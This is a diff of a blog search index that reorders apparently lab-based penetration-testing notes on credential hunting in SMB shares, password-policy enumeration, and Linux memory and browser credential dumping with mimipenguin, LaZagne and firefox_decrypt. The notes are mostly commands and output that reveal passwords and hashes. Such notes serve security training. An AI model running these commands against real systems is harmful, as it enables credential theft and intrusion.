@@ -272,43 +272,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Credential Hunting in Network Shares</title>
-    <url>/2025/11/27/Credential-Hunting-in-Network-Shares/</url>
-    <content><![CDATA[<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="From-Domain-Joined-Machine"><a href="#From-Domain-Joined-Machine" class="headerlink" title="From Domain Joined Machine"></a>From Domain Joined Machine</h2><h3 id="Snaffler"><a href="#Snaffler" class="headerlink" title="Snaffler"></a>Snaffler</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\Users\Public&gt;Snaffler.exe <span class="literal">-s</span></span><br></pre></td></tr></table></figure>
-
-
-<ul>
-<li><code>-u : retrieves a list of users from Active Directory and searches for references to them in files</code></li>
-<li><code>-i and -n allow you to specify which shares should be included in the search.</code></li>
-</ul>
-<h2 id="Non-Domain-Joined-Machine"><a href="#Non-Domain-Joined-Machine" class="headerlink" title="Non Domain Joined Machine"></a>Non Domain Joined Machine</h2><h3 id="PowerHuntShares"><a href="#PowerHuntShares" class="headerlink" title="PowerHuntShares"></a>PowerHuntShares</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Unblock-File</span> <span class="literal">-Path</span> C:\Users\Public\PowerHuntShares\PowerHuntShares.psm1</span><br><span class="line"><span class="built_in">Import-Module</span> C:\Users\Public\PowerHuntShares\PowerHuntShares.psm1</span><br><span class="line"><span class="built_in">Invoke-HuntSMBShares</span> <span class="literal">-Threads</span> <span class="number">100</span> <span class="literal">-OutputDirectory</span> c:\Users\Public</span><br><span class="line"></span><br><span class="line">[*][<span class="number">05</span>/<span class="number">01</span>/<span class="number">2025</span> <span class="number">12</span>:<span class="number">51</span>] Output Directory: c:\Users\Public\SmbShareHunt<span class="literal">-05012025125123</span></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h3 id="MANSPIDER"><a href="#MANSPIDER" class="headerlink" title="MANSPIDER"></a>MANSPIDER</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">manspider 10.129.182.89 -c <span class="string">&#x27;passw&#x27;</span> -u <span class="string">&#x27;mendres&#x27;</span> -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\Company\Forms\HR_Form_14.pdf: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] password: SecureDocs99</span><br><span class="line">[+] 10.129.182.89\Company\Forms\Incident_Report_57.xlsx: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] password=Summer2023!</span><br><span class="line"></span><br><span class="line">&lt;snip&gt;</span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\IT\Tools\split_tunnel.txt: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] <span class="comment"># Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">manspider 10.129.182.89 -c <span class="string">&#x27;INLANEFREIGHT&#x27;</span> -u <span class="string">&#x27;mendres&#x27;</span> -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\IT\Tools\split_tunnel.txt: matched <span class="string">&quot;INLANEFREIGHT&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] <span class="comment"># Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Netexec"><a href="#Netexec" class="headerlink" title="Netexec"></a>Netexec</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb 10.129.234.121 -u mendres -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span> --spider IT --content --pattern <span class="string">&quot;passw&quot;</span></span><br><span class="line"></span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.129.234.121  445    DC01             [+] inlanefreight.local\mendres:Inlanefreight2025! </span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Started spidering</span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Spidering .</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
-
-<p>We can also download the files locally:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb 104.152.52.235 -u mendres -p Inlanefreight2025! -M spider_plus -o DOWNLOAD_FLAG=True</span><br></pre></td></tr></table></figure>
-
-<p>Then search for the pattern we want:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/nxc_hosted/nxc_spider_plus/10.129.234.173</span><br><span class="line"></span><br><span class="line">grep -ri <span class="string">&quot;passw&quot;</span> .</span><br></pre></td></tr></table></figure>
-
-<p>Example result</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/nxc_hosted/nxc_spider_plus/10.129.234.173</span><br><span class="line"></span><br><span class="line">grep -ri <span class="string">&quot;passw&quot;</span> .</span><br><span class="line"></span><br><span class="line">Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Service-Enumeration</category>
-        <category>SMB</category>
-      </categories>
-      <tags>
-        <tag>SMB</tag>
-        <tag>Enumeration</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Attacking Child-Parent Trust From Windows</title>
     <url>/2025/12/03/Attacking-Child-Parent-Trust-From-Windows/</url>
     <content><![CDATA[<h1 id="Prerequisite"><a href="#Prerequisite" class="headerlink" title="Prerequisite"></a>Prerequisite</h1><blockquote>
@@ -370,6 +333,43 @@
         <tag>PowerView</tag>
         <tag>Mimikatz</tag>
         <tag>Rubeus</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Credential Hunting in Network Shares</title>
+    <url>/2025/11/27/Credential-Hunting-in-Network-Shares/</url>
+    <content><![CDATA[<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="From-Domain-Joined-Machine"><a href="#From-Domain-Joined-Machine" class="headerlink" title="From Domain Joined Machine"></a>From Domain Joined Machine</h2><h3 id="Snaffler"><a href="#Snaffler" class="headerlink" title="Snaffler"></a>Snaffler</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\Users\Public&gt;Snaffler.exe <span class="literal">-s</span></span><br></pre></td></tr></table></figure>
+
+
+<ul>
+<li><code>-u : retrieves a list of users from Active Directory and searches for references to them in files</code></li>
+<li><code>-i and -n allow you to specify which shares should be included in the search.</code></li>
+</ul>
+<h2 id="Non-Domain-Joined-Machine"><a href="#Non-Domain-Joined-Machine" class="headerlink" title="Non Domain Joined Machine"></a>Non Domain Joined Machine</h2><h3 id="PowerHuntShares"><a href="#PowerHuntShares" class="headerlink" title="PowerHuntShares"></a>PowerHuntShares</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Unblock-File</span> <span class="literal">-Path</span> C:\Users\Public\PowerHuntShares\PowerHuntShares.psm1</span><br><span class="line"><span class="built_in">Import-Module</span> C:\Users\Public\PowerHuntShares\PowerHuntShares.psm1</span><br><span class="line"><span class="built_in">Invoke-HuntSMBShares</span> <span class="literal">-Threads</span> <span class="number">100</span> <span class="literal">-OutputDirectory</span> c:\Users\Public</span><br><span class="line"></span><br><span class="line">[*][<span class="number">05</span>/<span class="number">01</span>/<span class="number">2025</span> <span class="number">12</span>:<span class="number">51</span>] Output Directory: c:\Users\Public\SmbShareHunt<span class="literal">-05012025125123</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h3 id="MANSPIDER"><a href="#MANSPIDER" class="headerlink" title="MANSPIDER"></a>MANSPIDER</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">manspider 10.129.182.89 -c <span class="string">&#x27;passw&#x27;</span> -u <span class="string">&#x27;mendres&#x27;</span> -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\Company\Forms\HR_Form_14.pdf: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] password: SecureDocs99</span><br><span class="line">[+] 10.129.182.89\Company\Forms\Incident_Report_57.xlsx: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] password=Summer2023!</span><br><span class="line"></span><br><span class="line">&lt;snip&gt;</span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\IT\Tools\split_tunnel.txt: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] <span class="comment"># Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">manspider 10.129.182.89 -c <span class="string">&#x27;INLANEFREIGHT&#x27;</span> -u <span class="string">&#x27;mendres&#x27;</span> -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\IT\Tools\split_tunnel.txt: matched <span class="string">&quot;INLANEFREIGHT&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] <span class="comment"># Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Netexec"><a href="#Netexec" class="headerlink" title="Netexec"></a>Netexec</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb 10.129.234.121 -u mendres -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span> --spider IT --content --pattern <span class="string">&quot;passw&quot;</span></span><br><span class="line"></span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.129.234.121  445    DC01             [+] inlanefreight.local\mendres:Inlanefreight2025! </span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Started spidering</span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Spidering .</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
+
+<p>We can also download the files locally:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb 104.152.52.235 -u mendres -p Inlanefreight2025! -M spider_plus -o DOWNLOAD_FLAG=True</span><br></pre></td></tr></table></figure>
+
+<p>Then search for the pattern we want:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/nxc_hosted/nxc_spider_plus/10.129.234.173</span><br><span class="line"></span><br><span class="line">grep -ri <span class="string">&quot;passw&quot;</span> .</span><br></pre></td></tr></table></figure>
+
+<p>Example result</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/nxc_hosted/nxc_spider_plus/10.129.234.173</span><br><span class="line"></span><br><span class="line">grep -ri <span class="string">&quot;passw&quot;</span> .</span><br><span class="line"></span><br><span class="line">Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Service-Enumeration</category>
+        <category>SMB</category>
+      </categories>
+      <tags>
+        <tag>SMB</tag>
+        <tag>Enumeration</tag>
       </tags>
   </entry>
   <entry>
@@ -527,6 +527,39 @@
       </tags>
   </entry>
   <entry>
+    <title>Enumerating &amp; Retrieving Password Policies</title>
+    <url>/2025/12/03/Enumerating-Retrieving-Password-Policies/</url>
+    <content><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h3 id="Using-Valid-Domain-Credential"><a href="#Using-Valid-Domain-Credential" class="headerlink" title="Using Valid Domain Credential"></a>Using Valid Domain Credential</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u username -p password --pass-pol</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Using-SMB-NULL-Sessions"><a href="#Using-SMB-NULL-Sessions" class="headerlink" title="Using SMB NULL Sessions"></a>Using SMB NULL Sessions</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u guest -p <span class="string">&#x27;&#x27;</span> --pass-pol</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcclient $&gt; getdompwinfo</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enum4linux-ng -P dc-ip</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Step 1: Get Base DN</span></span><br><span class="line"></span><br><span class="line">ldapsearch -x -H ldap://&lt;DC_IP&gt; -s base namingcontexts</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Use Base DN to retrieve password policy attributes</span></span><br><span class="line"></span><br><span class="line">ldapsearch -x -H ldap://&lt;DC_IP&gt; -b <span class="string">&quot;&lt;BASE_DN&gt;&quot;</span> -s sub <span class="string">&quot;*&quot;</span> | grep -m 1 -B 10 pwdHistoryLength</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h3 id="Using-SMB-NULL-Sessions-1"><a href="#Using-SMB-NULL-Sessions-1" class="headerlink" title="Using SMB NULL Sessions"></a>Using SMB NULL Sessions</h3><h4 id="net-exe-Built-in-Tool"><a href="#net-exe-Built-in-Tool" class="headerlink" title="net.exe : Built-in Tool"></a>net.exe : Built-in Tool</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; net accounts</span><br></pre></td></tr></table></figure>
+
+<h4 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">import-module</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainPolicy</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Enumeration</category>
+        <category>Users &amp; Passwords Enumeration</category>
+        <category>Enumerating &amp; Retrieving Password Policies</category>
+      </categories>
+      <tags>
+        <tag>netexec</tag>
+        <tag>rpcclient</tag>
+        <tag>ldapsearch</tag>
+        <tag>enum4linux-ng</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Extracting Passwords from Windows Registry.</title>
     <url>/2025/11/25/Extracting-Passwords-from-Windows-Systems/</url>
     <content><![CDATA[<h2 id="Dump-SAM-SYSTEM-And-SECURITY"><a href="#Dump-SAM-SYSTEM-And-SECURITY" class="headerlink" title="Dump SAM, SYSTEM, And SECURITY"></a>Dump SAM, SYSTEM, And SECURITY</h2><h3 id="Offline"><a href="#Offline" class="headerlink" title="Offline"></a>Offline</h3><h4 id="Copy-Registry"><a href="#Copy-Registry" class="headerlink" title="Copy Registry"></a>Copy Registry</h4><p>Key Registry Hives:</p>
@@ -563,42 +596,6 @@
       </categories>
       <tags>
         <tag>Dump-SAM</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux-Memory-Cache-Browser-Credentials-Hunting</title>
-    <url>/2025/11/27/Linux-Memory-Cache-Browser-Credentials-Hunting/</url>
-    <content><![CDATA[<h2 id="Mimipenguin-root-access-is-required"><a href="#Mimipenguin-root-access-is-required" class="headerlink" title="Mimipenguin ( root access is required )"></a>Mimipenguin ( root access is required )</h2><p>➜ Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 mimipenguin.py</span><br><span class="line"></span><br><span class="line">[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY</span><br></pre></td></tr></table></figure>
-
-<h2 id="LaZagne-Root-recommended-but-not-always-required"><a href="#LaZagne-Root-recommended-but-not-always-required" class="headerlink" title="LaZagne ( Root recommended, but not always required )"></a>LaZagne ( Root recommended, but not always required )</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python2.7 laZagne.py all</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------------- Shadow passwords -----------------</span><br><span class="line"></span><br><span class="line">[+] Hash found !!!</span><br><span class="line">Login: systemd-coredump</span><br><span class="line">Hash: !!:18858::::::</span><br><span class="line"></span><br><span class="line">[+] Hash found !!!</span><br><span class="line">Login: sambauser</span><br><span class="line">Hash: $6<span class="variable">$wgK4tGq7Jepa</span>.V0g<span class="variable">$QkxvseL</span>.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7:::</span><br><span class="line"></span><br><span class="line">[+] Password found !!!</span><br><span class="line">Login: cry0l1t3</span><br><span class="line">Password: WLpAEXFa0SbqOHY</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] 3 passwords have been found.</span><br><span class="line">For more information launch it again with the -v option</span><br><span class="line"></span><br><span class="line">elapsed <span class="keyword">time</span> = 3.50091600418</span><br></pre></td></tr></table></figure>
-
-
-<p>LaZagne without root</p>
-<ul>
-<li><code>browser passwords (if user profile is readable)</code></li>
-<li><code>Git credentials</code></li>
-<li><code>SSH keys</code></li>
-<li><code>environment variables</code></li>
-<li><code>configuration files</code></li>
-</ul>
-<h2 id="Browser-redentials"><a href="#Browser-redentials" class="headerlink" title="Browser redentials"></a>Browser redentials</h2><h3 id="Firefox"><a href="#Firefox" class="headerlink" title="Firefox"></a>Firefox</h3><h4 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h4><p>By default, Firefox stores saved credentials in an encrypted file named <code>logins.json</code>.</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -l .mozilla/firefox/ | grep default </span><br><span class="line"></span><br><span class="line">drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release</span><br><span class="line">drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> .mozilla/firefox/1bplpd86.default-release/logins.json | jq .</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;nextId&quot;</span>: 2,</span><br><span class="line">  <span class="string">&quot;logins&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;id&quot;</span>: 1,</span><br><span class="line">      <span class="string">&quot;hostname&quot;</span>: <span class="string">&quot;https://www.inlanefreight.com&quot;</span>,</span><br><span class="line">      <span class="string">&quot;httpRealm&quot;</span>: null,</span><br><span class="line">      <span class="string">&quot;formSubmitURL&quot;</span>: <span class="string">&quot;https://www.inlanefreight.com&quot;</span>,</span><br><span class="line">      <span class="string">&quot;usernameField&quot;</span>: <span class="string">&quot;username&quot;</span>,</span><br><span class="line">      <span class="string">&quot;passwordField&quot;</span>: <span class="string">&quot;password&quot;</span>,</span><br><span class="line">      <span class="string">&quot;encryptedUsername&quot;</span>: <span class="string">&quot;MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr&quot;</span>,</span><br><span class="line">      <span class="string">&quot;encryptedPassword&quot;</span>: <span class="string">&quot;MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=&quot;</span>,</span><br><span class="line">      <span class="string">&quot;guid&quot;</span>: <span class="string">&quot;&#123;412629aa-4113-4ff9-befe-dd9b4ca388e2&#125;&quot;</span>,</span><br><span class="line">      <span class="string">&quot;encType&quot;</span>: 1,</span><br><span class="line">      <span class="string">&quot;timeCreated&quot;</span>: 1643373110869,</span><br><span class="line">      <span class="string">&quot;timeLastUsed&quot;</span>: 1643373110869,</span><br><span class="line">      <span class="string">&quot;timePasswordChanged&quot;</span>: 1643373110869,</span><br><span class="line">      <span class="string">&quot;timesUsed&quot;</span>: 1</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;potentiallyVulnerablePasswords&quot;</span>: [],</span><br><span class="line">  <span class="string">&quot;dismissedBreachAlertsByLoginGUID&quot;</span>: &#123;&#125;,</span><br><span class="line">  <span class="string">&quot;version&quot;</span>: 3</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="Decrypt"><a href="#Decrypt" class="headerlink" title="Decrypt"></a>Decrypt</h4><p>To decrypt saved credentials we can use <a href="https://github.com/unode/firefox_decrypt">firefox_decrypt</a></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3.9 firefox_decrypt.py</span><br><span class="line"></span><br><span class="line">Select the Mozilla profile you wish to decrypt</span><br><span class="line">1 -&gt; lfx3lvhb.default</span><br><span class="line">2 -&gt; 1bplpd86.default-release</span><br><span class="line"></span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">Website:   https://testing.dev.inlanefreight.com</span><br><span class="line">Username: <span class="string">&#x27;test&#x27;</span></span><br><span class="line">Password: <span class="string">&#x27;test&#x27;</span></span><br><span class="line"></span><br><span class="line">Website:   https://www.inlanefreight.com</span><br><span class="line">Username: <span class="string">&#x27;cry0l1t3&#x27;</span></span><br><span class="line">Password: <span class="string">&#x27;FzXUxJemKm6g2lGh&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Linux</category>
-        <category>Post Exploitation</category>
-        <category>Credential Hunting</category>
-      </categories>
-      <tags>
-        <tag>browser-credentials</tag>
-        <tag>LaZagne</tag>
-        <tag>Mimipenguin</tag>
       </tags>
   </entry>
   <entry>
@@ -640,6 +637,42 @@
       </tags>
   </entry>
   <entry>
+    <title>Linux-Memory-Cache-Browser-Credentials-Hunting</title>
+    <url>/2025/11/27/Linux-Memory-Cache-Browser-Credentials-Hunting/</url>
+    <content><![CDATA[<h2 id="Mimipenguin-root-access-is-required"><a href="#Mimipenguin-root-access-is-required" class="headerlink" title="Mimipenguin ( root access is required )"></a>Mimipenguin ( root access is required )</h2><p>➜ Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 mimipenguin.py</span><br><span class="line"></span><br><span class="line">[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY</span><br></pre></td></tr></table></figure>
+
+<h2 id="LaZagne-Root-recommended-but-not-always-required"><a href="#LaZagne-Root-recommended-but-not-always-required" class="headerlink" title="LaZagne ( Root recommended, but not always required )"></a>LaZagne ( Root recommended, but not always required )</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python2.7 laZagne.py all</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------------- Shadow passwords -----------------</span><br><span class="line"></span><br><span class="line">[+] Hash found !!!</span><br><span class="line">Login: systemd-coredump</span><br><span class="line">Hash: !!:18858::::::</span><br><span class="line"></span><br><span class="line">[+] Hash found !!!</span><br><span class="line">Login: sambauser</span><br><span class="line">Hash: $6<span class="variable">$wgK4tGq7Jepa</span>.V0g<span class="variable">$QkxvseL</span>.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7:::</span><br><span class="line"></span><br><span class="line">[+] Password found !!!</span><br><span class="line">Login: cry0l1t3</span><br><span class="line">Password: WLpAEXFa0SbqOHY</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] 3 passwords have been found.</span><br><span class="line">For more information launch it again with the -v option</span><br><span class="line"></span><br><span class="line">elapsed <span class="keyword">time</span> = 3.50091600418</span><br></pre></td></tr></table></figure>
+
+
+<p>LaZagne without root</p>
+<ul>
+<li><code>browser passwords (if user profile is readable)</code></li>
+<li><code>Git credentials</code></li>
+<li><code>SSH keys</code></li>
+<li><code>environment variables</code></li>
+<li><code>configuration files</code></li>
+</ul>
+<h2 id="Browser-redentials"><a href="#Browser-redentials" class="headerlink" title="Browser redentials"></a>Browser redentials</h2><h3 id="Firefox"><a href="#Firefox" class="headerlink" title="Firefox"></a>Firefox</h3><h4 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h4><p>By default, Firefox stores saved credentials in an encrypted file named <code>logins.json</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -l .mozilla/firefox/ | grep default </span><br><span class="line"></span><br><span class="line">drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release</span><br><span class="line">drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> .mozilla/firefox/1bplpd86.default-release/logins.json | jq .</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;nextId&quot;</span>: 2,</span><br><span class="line">  <span class="string">&quot;logins&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;id&quot;</span>: 1,</span><br><span class="line">      <span class="string">&quot;hostname&quot;</span>: <span class="string">&quot;https://www.inlanefreight.com&quot;</span>,</span><br><span class="line">      <span class="string">&quot;httpRealm&quot;</span>: null,</span><br><span class="line">      <span class="string">&quot;formSubmitURL&quot;</span>: <span class="string">&quot;https://www.inlanefreight.com&quot;</span>,</span><br><span class="line">      <span class="string">&quot;usernameField&quot;</span>: <span class="string">&quot;username&quot;</span>,</span><br><span class="line">      <span class="string">&quot;passwordField&quot;</span>: <span class="string">&quot;password&quot;</span>,</span><br><span class="line">      <span class="string">&quot;encryptedUsername&quot;</span>: <span class="string">&quot;MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr&quot;</span>,</span><br><span class="line">      <span class="string">&quot;encryptedPassword&quot;</span>: <span class="string">&quot;MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=&quot;</span>,</span><br><span class="line">      <span class="string">&quot;guid&quot;</span>: <span class="string">&quot;&#123;412629aa-4113-4ff9-befe-dd9b4ca388e2&#125;&quot;</span>,</span><br><span class="line">      <span class="string">&quot;encType&quot;</span>: 1,</span><br><span class="line">      <span class="string">&quot;timeCreated&quot;</span>: 1643373110869,</span><br><span class="line">      <span class="string">&quot;timeLastUsed&quot;</span>: 1643373110869,</span><br><span class="line">      <span class="string">&quot;timePasswordChanged&quot;</span>: 1643373110869,</span><br><span class="line">      <span class="string">&quot;timesUsed&quot;</span>: 1</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;potentiallyVulnerablePasswords&quot;</span>: [],</span><br><span class="line">  <span class="string">&quot;dismissedBreachAlertsByLoginGUID&quot;</span>: &#123;&#125;,</span><br><span class="line">  <span class="string">&quot;version&quot;</span>: 3</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="Decrypt"><a href="#Decrypt" class="headerlink" title="Decrypt"></a>Decrypt</h4><p>To decrypt saved credentials we can use <a href="https://github.com/unode/firefox_decrypt">firefox_decrypt</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3.9 firefox_decrypt.py</span><br><span class="line"></span><br><span class="line">Select the Mozilla profile you wish to decrypt</span><br><span class="line">1 -&gt; lfx3lvhb.default</span><br><span class="line">2 -&gt; 1bplpd86.default-release</span><br><span class="line"></span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">Website:   https://testing.dev.inlanefreight.com</span><br><span class="line">Username: <span class="string">&#x27;test&#x27;</span></span><br><span class="line">Password: <span class="string">&#x27;test&#x27;</span></span><br><span class="line"></span><br><span class="line">Website:   https://www.inlanefreight.com</span><br><span class="line">Username: <span class="string">&#x27;cry0l1t3&#x27;</span></span><br><span class="line">Password: <span class="string">&#x27;FzXUxJemKm6g2lGh&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Linux</category>
+        <category>Post Exploitation</category>
+        <category>Credential Hunting</category>
+      </categories>
+      <tags>
+        <tag>browser-credentials</tag>
+        <tag>LaZagne</tag>
+        <tag>Mimipenguin</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux Pass the Hash (PtH)</title>
     <url>/2025/11/27/Linux-Pass-the-Hash-PtH/</url>
     <content><![CDATA[<h1 id="NetExec"><a href="#NetExec" class="headerlink" title="NetExec"></a>NetExec</h1><h3 id="Domain-Account"><a href="#Domain-Account" class="headerlink" title="Domain Account"></a>Domain Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb ip -u username -d Domain -H <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
@@ -668,39 +701,6 @@
         <tag>evil-winrm</tag>
         <tag>impacket-psexec</tag>
         <tag>xfreerdp</tag>
-      </tags>
